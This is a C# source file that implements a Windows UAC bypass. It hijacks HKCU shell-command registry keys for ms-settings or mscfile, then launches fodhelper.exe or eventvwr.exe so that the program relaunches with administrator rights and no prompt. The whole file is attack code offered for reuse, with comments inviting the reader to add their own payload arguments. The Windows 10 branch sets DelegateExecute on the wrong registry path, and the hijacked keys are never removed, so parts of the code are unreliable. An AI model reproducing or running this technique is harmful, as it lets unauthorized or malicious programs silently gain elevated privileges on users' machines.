// rewrited the whole thing in my phone, so there might be issues related to formats of the code.
// might fix it later, but the code still works, don't worry (dw)

using System;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Diagnostics;
using System.IO; 
using System.Security.Principal;
using System.Collections.Generic;
using System.Windows.Forms;

namespace UACBypassExample
{
     internal class Imports
     {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Wow64DisableWow64FsRedirection(out IntPtr oldValue);        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Wow64RevertWow64FsRedirection(IntPtr oldValue);
     }
      
     internal class UAC
     {

        struct UACPath
        {

            public string RegPath;
            public string FilePath;

            public UACPath(string RegPath, string FilePath)
            {
                 this.RegPath = RegPath;
                 this.FilePath = FilePath;
            }

        }

        public static void Bypass()
        {
             List<UACPath> upath = new List<UACPath>
             {
		          // FODHELPER METHOD: Windows 10 2016 and up.
                  new UACPath( "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command", "C:\\Windows\\System32\\fodhelper.exe" ), // 0
                  // EVENTVWR METHOD: Windows versions less than Windows 10
		          new UACPath( "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command",     "C:\\Windows\\System32\\eventvwr.exe"  )  // 1
             };

             IntPtr ov = IntPtr.Zero;

             try
             {
		          // to get the actual version, you need to embed the manifest with a <supportedOS>
                  // entry. Otherwise Environment.OSVersion might return Windows 8 instead of 10.
                  // That entry is created along with the manifest, you just need to remove the comment tag 
                  // <!-- .. --> within the supportedOS entry.
                  bool isWin10up = (Environment.OSVersion.Version.Major >= 10 && Environment.OSVersion.Version.Build >= 14393) || File.Exists(upath[0].FilePath);
                  Registry.SetValue(upath[isWin10up ? 0 : 1].RegPath, "", $"{Application.ExecutablePath}" /* put any arguments here if you want. */);

                  if (isWin10up)
                        Registry.SetValue(upath[1].RegPath, "DelegateExecute", "");
                  
		          // use this if your program is running on 32 bit.
		          // it is used to prevent redirection to SysWOW64 when trying to access something
                  // on System32, since both fodhelper and eventvwr doesn't even exists there somehow.
                  if (Imports.Wow64DisableWow64FsRedirection(out ov))
                  {
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = upath[isWin10up ? 0 : 1].FilePath,
                            CreateNoWindow = true, // optional.
                        }

                        ).WaitForExit();
                    }
                    else Console.WriteLine("Failed to disable WoW64FsRedirection");
              }
              catch (Exception ex)
              {
                  Console.WriteLine(ex.Message);
              }
              finally
              {
		            // Reverting is somewhat important.

                    if (!Imports.Wow64RevertWow64FsRedirection(ov))
                        Console.WriteLine("Failed to revert WoW64FsRedirection.");
              }
         }
     }

     public static class Program
     {
         static void Main(string[] args)
         {
             if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
             {
                 // do something, since your process is already elevated.
             }
             else
             {
                 // if not, perform a UAC bypass
                 UAC.Bypass();
             }
         }
     }
}
